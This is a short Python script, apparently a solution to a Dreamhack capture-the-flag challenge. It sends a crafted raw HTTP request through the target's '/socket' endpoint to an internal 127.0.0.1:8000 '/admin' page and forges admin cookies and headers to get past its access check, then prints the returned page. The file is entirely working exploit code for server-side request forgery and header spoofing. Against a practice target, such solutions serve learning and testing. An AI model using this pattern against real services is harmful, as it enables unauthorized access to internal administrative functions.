import requests
from bs4 import BeautifulSoup


if __name__ == "__main__":
    debug = {'http': 'http://localhost:8080'}
    url = "http://host3.dreamhack.games:22666"
    raw = b"""POST /admin HTTP/1.1
Host: 127.0.0.1
User-Agent: Admin Browser
DreamhackUser: admin
Cookie: admin=true
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

userid=admin"""
    body = {
        'host': '127.0.0.1',
        'port': '8000',
        'data': raw
    }
    res = requests.post(url+'/socket', data=body, proxies=debug)
    print(BeautifulSoup(res.content, 'html.parser').find("pre"))